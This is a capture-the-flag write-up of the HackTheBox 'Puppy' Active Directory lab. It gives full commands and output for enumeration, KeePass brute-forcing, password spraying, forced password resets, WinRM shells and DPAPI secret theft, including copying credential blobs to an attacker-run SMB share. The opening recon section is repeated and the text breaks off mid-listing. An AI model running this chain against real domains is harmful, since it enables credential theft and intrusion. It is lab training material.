---
icon: dog
---

# HTB-PUPPY (S8)

<figure><img src="../../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

## Attack Flow Explanation

### Overview

This HTB box involves a multi-step privilege escalation chain exploiting AD permissions and credential storage issues.

### Attack Chain

**1. james.levi → DEVELOPERS Group** Starting with `james.levi`, I used GenericWrite permissions to add myself to the DEVELOPERS group.

**2. DEVELOPERS → DEV Share Access** Group membership granted access to the DEV network share containing sensitive files.

**3. DEV Share → KeePass Database** Found a KeePass database file in the shared directory.

**4. KeePass → User Credentials** Brute forced the database master password and extracted multiple user credentials.

**5. Credentials → ant.edwards** Used extracted credentials to access the `ant.edwards` account.

**6. ant.edwards → adam.silver** Leveraged GenericAll permissions to obtain shell access as `adam.silver`.

**7. adam.silver → /Backups Access** Accessed the `/Backups` directory containing configuration files.

**8. Configuration Files → steph.cooper** Found hardcoded credentials for `steph.cooper` in backup files.

**9. steph.cooper → DPAPI Extraction** Extracted DPAPI credentials from the user profile.

**10. DPAPI → steph.cooper\_adm** Decrypted DPAPI secrets to obtain administrative credentials and complete privilege escalation.

### Key Vulnerabilities

* AD permission misconfigurations (GenericWrite/GenericAll)
* Accessible credential database with weak master password
* Hardcoded credentials in configuration files
* Exposed DPAPI secrets in user profiles

Recon :

```python
sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ rustscan -a 10.10.11.70 --ulimit 5000 --range 1-1000 -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.

Discovered open port 139/tcp on 10.10.11.70
Discovered open port 135/tcp on 10.10.11.70
Discovered open port 53/tcp on 10.10.11.70
Discovered open port 111/tcp on 10.10.11.70
Discovered open port 88/tcp on 10.10.11.70
Discovered open port 445/tcp on 10.10.11.70
Discovered open port 636/tcp on 10.10.11.70
Discovered open port 464/tcp on 10.10.11.70
Discovered open port 389/tcp on 10.10.11.70
Discovered open port 593/tcp on 10.10.11.70

PORT    STATE SERVICE       REASON          VERSION
53/tcp  open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp  open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-18 16:18:30Z)
111/tcp open  rpcbind?      syn-ack ttl 127
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|_  100003  2,3         2049/udp6  nfs
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds? syn-ack ttl 127
464/tcp open  kpasswd5?     syn-ack ttl 127
593/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62785/tcp): CLEAN (Timeout)
|   Check 2 (port 58506/tcp): CLEAN (Timeout)
|   Check 3 (port 26380/udp): CLEAN (Timeout)
|   Check 4 (port 57090/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-05-18T16:19:24
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

### Using `CrackMapExec`, we enumerate and scan users by leveraging valid username and password credentials.

HTB- {As is common in real life pentests, you will start the Puppy box with credentials for the following account: `levi.james / KingofAkron2025!`}

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ sudo crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --users
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [+] Enumerated domain user(s)
SMB         10.10.11.70     445    DC               PUPPY.HTB\\steph.cooper_adm               badpwdcount: 2 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\steph.cooper                   badpwdcount: 0 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\jamie.williams                 badpwdcount: 3 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\adam.silver                    badpwdcount: 21 desc:                                                                                                            
SMB         10.10.11.70     445    DC               PUPPY.HTB\\ant.edwards                    badpwdcount: 0 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\levi.james                     badpwdcount: 0 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\krbtgt                         badpwdcount: 3 desc: Key Distribution Center Service Account                                                                     
SMB         10.10.11.70     445    DC               PUPPY.HTB\\Guest                          badpwdcount: 3 desc: Built-in account for guest access to the computer/domain                                                    
SMB         10.10.11.70     445    DC               PUPPY.HTB\\Administrator                  badpwdcount: 3 desc: Built-in account for administering the computer/domain
```

As we can se we found Domain controler and domain so lets add this to out `/etc/hosts` file :

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ echo "10.10.11.70 DC.PUPPY.HTB PUPPY.HTB" | sudo tee -a /etc/hosts > /dev/null
```

> We used the nxc smb command to run a RID brute-force attack on the PUPPY.HTB machine using valid login credentials (levi.james : KingofAkron2025!). This helped us find actual user accounts. We then filtered only real users (SidTypeUser) and saved their usernames into a users.txt file for future use.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ nxc smb PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}' > users.txt

┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ ls 
nmapscan.txt  users.txt
                                                                                                               
┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ cat users.txt 
Administrator
Guest
krbtgt
DC$
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

***

> Now Below We added the IP address of the domain controller to /etc/resolv.conf so that DNS resolution works properly for domain names. This is needed before running tools like bloodhound-python to scan the Active Directory environment. After editing, we confirmed the nameserver entries using the cat command.

```python
sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 10.10.11.70   # Domain Controller DNS
nameserver 8.8.8.8         # Optional backup DNS
nameserver 1.1.1.1         # Optional backup DNS

```

***

using BloodHound :

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70 
   
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb

 INFO BloodHound.py for BloodHound LEGACY BloodHound 4.2 and 4.3
 INFO Found AD domain: puppy.htb
 INFO Getting TGT for user
 WARNING Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_
 ERR_SKEWClock skew too great)
 INFO Connecting to LDAP server: DC.PUPPY.HTB
 INFO Found 1 domains
 INFO Found 1 domains in the forest
 INFO Found 1 computers
 INFO Connecting to LDAP server: DC.PUPPY.HTB
 INFO Found 10 users
 INFO Found 56 groups
 INFO Found 3 gpos
 INFO Found 3 ous
 INFO Found 19 containers
 INFO Found 0 trusts
 INFO Starting computer enumeration with 10 workers
 INFO Querying computer: DC.PUPPY.HTB
 INFO Done in 00M 19S
```

<figure><img src="../../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

#### 📝 **Checking SMB Shares with CrackMapExec**

Our user has `GenericWrite` rights on the **Developers group**, but that’s not enough for direct exploitation. So, we dig deeper.

We use `crackmapexec` to enumerate available SMB file shares using valid credentials:

```bash
sudo crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --shares

```

This lists all accessible shares on the Domain Controller. Example output:

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ sudo crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --shares

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [+] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```

From here, we can check if any writable shares (like `DEV`) are available for lateral movement or privilege escalation.

***

#### We have a shared folder named DEV, and we try to access it.

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ smbclient \\\\\\\\10.10.11.70\\\\DEV -U "levi.james"
 Password for WORKGROUP\\levi.james]:
 Try "help" to get a list of possible commands.
 smb: \\> dir
 .                                  DR        0  Sun Mar 23 03:07:57 2025
 ..                                  D        0  Sat Mar  8 115257 2025
 KeePassXC2.7.9:Win64.msi           A 34394112  Sun Mar 23 030912 2025
 Projects                            D        0  Sat Mar  8 115336 2025
 recovery.kdbx                       A     2677  Tue Mar 11 222546 2025
                                     5080575 blocks of size 4096. 1545105 blocks available
 smb: \\>  get recovery.kdbx
 getting file \\recovery.kdbx of size 2677 as recovery.kdbx 6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)
 smb: \\> 
```

Lets try to crack `recovery.kdbx` file

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ sudo apt install keepassxc
```

```python
─(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ wget <https://raw.githubusercontent.com/r3nt0n/keepass4brute/master/keepass4brute.sh>
--2025-05-18 17:36:24--  <https://raw.githubusercontent.com/r3nt0n/keepass4brute/master/keepass4brute.sh>
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8003::154, 2606:50c0:8000::154, 2606:50c0:8001::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8003::154|:443... failed: Connection timed out.
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8000::154|:443... failed: Connection timed out.
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8001::154|:443... failed: Connection timed out.
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8002::154|:443... failed: Connection timed out.
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2820 (2.8K) [text/plain]
Saving to: ‘keepass4brute.sh’

keepass4brute.sh                100%[=====================================================>]   2.75K  --.-KB/s    in 0.01s   

2025-05-18 17:45:30 (211 KB/s) - ‘keepass4brute.sh’ saved [2820/2820]

┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ chmod +x keepass4brute.sh 
```

Lets try this shit !

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$  ./keepass4brute.sh recovery.kdbx  /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
<https://github.com/r3nt0n/keepass4brute> 
```

![image.png](attachment:f5f32edd-56ab-47c8-abb1-903a3273e704:image.png)

👉 **We found the password 'liverpool' and extracted the passwords and information from the `recovery.kdbx` file into an XML format file named `keepass_dump.xml`.**

Let's check for accessible SMB shares:

```bash
smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
```

In the output, I notice a DEV share that appears to be intended for PUPPY-DEVS group members, but our current user doesn't have access to it

Now I can export the contents of the database:

```bash
keepassxc-cli export --format=xml recovery.kdbx > keepass_dump.xml
```

When prompted, I enter the password: `liverpool`

### Finding Credentials in the KeePass Database

Let's create a Python script to extract usernames and passwords from the XML file:

```python
import xml.etree.ElementTree as ET
tree = ET.parse('keepass_dump.xml')
root = tree.getroot()
for entry in root.iter('Entry'):
    username = None
    password = None
    for string in entry.findall('String'):
        key = string.find('Key').text
        value = string.find('Value').text
        if key == 'UserName':
            username = value
        elif key == 'Password':
            password = value
    if username or password:
        print(f"User: {username}, Password: {password}")
```

Running this script reveals several credentials, including:

* JamieLove2025!
* HJKL2025!
* Antman2025!
* Steve2025!
* ILY2025!

Let's extract just the passwords into a file:

```bash
python3 extract_keepass.py | awk -F'Password: ' '{print $2}' > passwords_only.txt
```

### Password Spraying

Now, I'll try these passwords against the user accounts we discovered earlier:

```bash
crackmapexec smb 10.10.11.70 -u users.txt -p passwords_only.txt --continue-on-success
```

In the output, I identify a valid credential pair:

* **Username:** ant.edwards
* **Password:** Antman2025!

```
SMB    10.10.11.70    445    DC    [+] PUPPY.HTB\\ant.edwards:Antman2025!
```

### Second Privilege Escalation: Targeting adam.silver

Let's run BloodHound again with the new credentials:

```bash
bloodhound-python -dc DC.PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70
```

After analyzing the results, I discover that `ant.edwards` has `GenericWrite` permissions on the `adam.silver` user account. This means we can modify this account, including enabling it if it's disabled and resetting its password.

Let's check if we can write to the adam.silver account:

```bash
bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' get writable --detail | grep -E "distinguishedName: CN=.*DC=PUPPY,DC=HTB" -A 10
```

The output confirms we have extensive write permissions on adam.silver's account.

Let's check the status of adam.silver's account:

```bash
crackmapexec smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987' -d PUPPY.HTB
```

```
SMB    10.10.11.70    445    DC    [-] PUPPY.HTB\\ADAM.SILVER:Password@987 STATUS_ACCOUNT_DISABLED
```

The account is disabled. Let's enable it and set a password:

```bash
bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p Antman2025! remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
```

```
[-] ['ACCOUNTDISABLE'] property flags removed from ADAM.SILVER's userAccountControl
```

Now, let's set a password for the account:

```bash
rpcclient -U 'puppy.htb\\ant.edwards%Antman2025!' 10.10.11.70 -c "setuserinfo ADAM.SILVER 23 Password@987"
```

Let's verify our access:

```bash
crackmapexec smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987'
```

```
SMB    10.10.11.70    445    DC    [+] PUPPY.HTB\\ADAM.SILVER:Password@987
```

Let's also check WinRM access:

```bash
crackmapexec winrm 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987' -d PUPPY.HTB
```

```
HTTP    10.10.11.70    5985    DC    [+] PUPPY.HTB\\ADAM.SILVER:Password@987 (Pwn3d!)
```

Great! We now have access to adam.silver's account.

### Accessing as adam.silver and Finding the User Flag

Let's connect using Evil-WinRM:

```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987'
```

Once connected, I can access the user flag:

```powershell
*Evil-WinRM* PS C:\\Users\\adam.silver\\Documents> cd ../Desktop
*Evil-WinRM* PS C:\\Users\\adam.silver\\Desktop> type user.txt
```

**User Flag:** `xx45203f370ae16dxxxxxxxxx`

### Exploring for Further Privilege Escalation

Let's continue exploring the system:

```powershell
*Evil-WinRM* PS C:\\> dir
```

I discover a Backups folder:

```powershell
*Evil-WinRM* PS C:\\Backups> dir
```

```
Directory: C:\\Backups

Mode    LastWriteTime    Length    Name
----    -------------    ------    ----
-a----    3/8/2025 8:22 AM    4639546    site-backup-2024-12-30.zip
```

Let's download this file for analysis:

```powershell
*Evil-WinRM* PS C:\\Backups> download site-backup-2024-12-30.zip
```

### Analyzing the Site Backup

After extracting the ZIP file, I examine its contents:

```bash
unzip site-backup-2024-12-30.zip -d ./puppy
cd ./puppy
```

I find an interesting backup configuration file: `nms-auth-config.xml.bak`

```bash
cat nms-auth-config.xml.bak
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
  <server>
    <host>DC.PUPPY.HTB</host>
    <port>389</port>
    <base-dn>dc=PUPPY,dc=HTB</base-dn>
    <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
    <bind-password>ChefSteph2025!</bind-password>
  </server>
  <!-- Additional configuration details omitted -->
</ldap-config>
```

This file contains credentials for steph.cooper:

* **Username:** steph.cooper
* **Password:** ChefSteph2025!

### Third Privilege Escalation: Access as steph.cooper

Let's verify these credentials:

```bash
crackmapexec winrm 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!' -d PUPPY.HTB
```

```
HTTP    10.10.11.70    5985    DC    [+] PUPPY.HTB\\steph.cooper:ChefSteph2025! (Pwn3d!)
```

Great! Let's connect with Evil-WinRM:

```bash
evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'
```

### DPAPI Credential Harvesting

After connecting as steph.cooper, I'll look for stored credentials. In Windows, credentials are often protected using DPAPI.

```powershell
*Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents> dir C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\
```

```
Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials

Mode    LastWriteTime    Length    Name
----    -------------    ------    ----
-a-hs-    3/8/2025 7:54 AM    414    C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

I also need the DPAPI master key:

```powershell
*Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents> dir C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\\
```

```
Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107

Mode    LastWriteTime    Length    Name
----    -------------    ------    ----
-a-hs-    3/8/2025 7:40 AM    740    556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-    2/23/2025 2:36 PM    24    Preferred
```

Now I'll download these files for offline decryption. First, I start an SMB server on my attacking machine:

```bash
mkdir -p ./share
impacket-smbserver share ./share -smb2support
```

Then on the target via Evil-WinRM:

```powershell
*Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents> copy "C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\\556a2412-1275-4ccf-b721-e6a0b4f90407" \\\\10.10.14.xx\\share\\masterkey_blob

*Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents> copy "C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\\\10.10.14.xx\\share\\credential_blob
```

### Offline DPAPI Credential Decryption

Now that I have the necessary files, I'll decrypt them using Impacket's DPAPI tool:

```bash
python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
```

The decryption provides a master key:

```
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Now I'll use this key to decrypt the credential blob:

```bash
python3 /usr/share/doc/python3-impacket/examples/dpapi.py credential -f credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```
[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target : Domain:target=PUPPY.HTB
Description :
Unknown :
Username : steph.cooper_adm
Unknown : FivethChipOnItsWay2025!
```

Great! I've discovered another set of credentials:

* **Username:** steph.cooper\_adm
* **Password:** FivethChipOnItsWay2025!

Recon : /code\\

```python
sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ rustscan -a 10.10.11.70 --ulimit 5000 --range 1-1000 -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.

Discovered open port 139/tcp on 10.10.11.70
Discovered open port 135/tcp on 10.10.11.70
Discovered open port 53/tcp on 10.10.11.70
Discovered open port 111/tcp on 10.10.11.70
Discovered open port 88/tcp on 10.10.11.70
Discovered open port 445/tcp on 10.10.11.70
Discovered open port 636/tcp on 10.10.11.70
Discovered open port 464/tcp on 10.10.11.70
Discovered open port 389/tcp on 10.10.11.70
Discovered open port 593/tcp on 10.10.11.70

PORT    STATE SERVICE       REASON          VERSION
53/tcp  open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp  open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-18 16:18:30Z)
111/tcp open  rpcbind?      syn-ack ttl 127
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|_  100003  2,3         2049/udp6  nfs
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds? syn-ack ttl 127
464/tcp open  kpasswd5?     syn-ack ttl 127
593/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62785/tcp): CLEAN (Timeout)
|   Check 2 (port 58506/tcp): CLEAN (Timeout)
|   Check 3 (port 26380/udp): CLEAN (Timeout)
|   Check 4 (port 57090/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-05-18T16:19:24
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

### Using `CrackMapExec`, we enumerate and scan users by leveraging valid username and password credentials.

HTB- {As is common in real life pentests, you will start the Puppy box with credentials for the following account: `levi.james / KingofAkron2025!`}

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ sudo crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --users
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [+] Enumerated domain user(s)
SMB         10.10.11.70     445    DC               PUPPY.HTB\\steph.cooper_adm               badpwdcount: 2 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\steph.cooper                   badpwdcount: 0 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\jamie.williams                 badpwdcount: 3 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\adam.silver                    badpwdcount: 21 desc:                                                                                                            
SMB         10.10.11.70     445    DC               PUPPY.HTB\\ant.edwards                    badpwdcount: 0 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\levi.james                     badpwdcount: 0 desc:                                                                                                             
SMB         10.10.11.70     445    DC               PUPPY.HTB\\krbtgt                         badpwdcount: 3 desc: Key Distribution Center Service Account                                                                     
SMB         10.10.11.70     445    DC               PUPPY.HTB\\Guest                          badpwdcount: 3 desc: Built-in account for guest access to the computer/domain                                                    
SMB         10.10.11.70     445    DC               PUPPY.HTB\\Administrator                  badpwdcount: 3 desc: Built-in account for administering the computer/domain
```

As we can se we found Domain controler and domain so lets add this to out `/etc/hosts` file :

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ echo "10.10.11.70 DC.PUPPY.HTB PUPPY.HTB" | sudo tee -a /etc/hosts > /dev/null
```

> We used the nxc smb command to run a RID brute-force attack on the PUPPY.HTB machine using valid login credentials (levi.james : KingofAkron2025!). This helped us find actual user accounts. We then filtered only real users (SidTypeUser) and saved their usernames into a users.txt file for future use.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ nxc smb PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}' > users.txt

┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ ls 
nmapscan.txt  users.txt
                                                                                                               
┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ cat users.txt 
Administrator
Guest
krbtgt
DC$
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

***

> Now Below We added the IP address of the domain controller to /etc/resolv.conf so that DNS resolution works properly for domain names. This is needed before running tools like bloodhound-python to scan the Active Directory environment. After editing, we confirmed the nameserver entries using the cat command.

```python
sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 10.10.11.70   # Domain Controller DNS
nameserver 8.8.8.8         # Optional backup DNS
nameserver 1.1.1.1         # Optional backup DNS

```

***

using BloodHound :

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70 
   
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb

 INFO BloodHound.py for BloodHound LEGACY BloodHound 4.2 and 4.3
 INFO Found AD domain: puppy.htb
 INFO Getting TGT for user
 WARNING Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_
 ERR_SKEWClock skew too great)
 INFO Connecting to LDAP server: DC.PUPPY.HTB
 INFO Found 1 domains
 INFO Found 1 domains in the forest
 INFO Found 1 computers
 INFO Connecting to LDAP server: DC.PUPPY.HTB
 INFO Found 10 users
 INFO Found 56 groups
 INFO Found 3 gpos
 INFO Found 3 ous
 INFO Found 19 containers
 INFO Found 0 trusts
 INFO Starting computer enumeration with 10 workers
 INFO Querying computer: DC.PUPPY.HTB
 INFO Done in 00M 19S
```

![image.png](attachment:e6b3bfe7-3feb-4acf-b800-7d276a23c2ef:image.png)

#### 📝 **Checking SMB Shares with CrackMapExec**

Our user has `GenericWrite` rights on the **Developers group**, but that’s not enough for direct exploitation. So, we dig deeper.

We use `crackmapexec` to enumerate available SMB file shares using valid credentials:

```bash
sudo crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --shares

```

This lists all accessible shares on the Domain Controller. Example output:

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ sudo crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --shares

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [+] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```

From here, we can check if any writable shares (like `DEV`) are available for lateral movement or privilege escalation.

***

#### We have a shared folder named DEV, and we try to access it.

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ smbclient \\\\\\\\10.10.11.70\\\\DEV -U "levi.james"
 Password for WORKGROUP\\levi.james]:
 Try "help" to get a list of possible commands.
 smb: \\> dir
 .                                  DR        0  Sun Mar 23 03:07:57 2025
 ..                                  D        0  Sat Mar  8 115257 2025
